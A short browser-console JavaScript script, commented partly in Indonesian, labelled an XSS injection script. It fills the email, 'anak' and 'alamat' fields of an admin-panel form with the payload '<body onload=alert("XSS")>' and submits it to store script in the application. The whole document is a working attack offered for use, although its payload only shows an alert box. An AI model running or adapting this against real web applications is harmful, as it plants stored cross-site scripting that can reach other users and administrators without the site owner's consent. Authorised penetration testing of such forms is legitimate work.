
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<body onload=alert("XSS")>`;
    document.getElementById('anak').value = `<body onload=alert("XSS")>`;
    document.getElementById('alamat').value = `<body onload=alert("XSS")>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
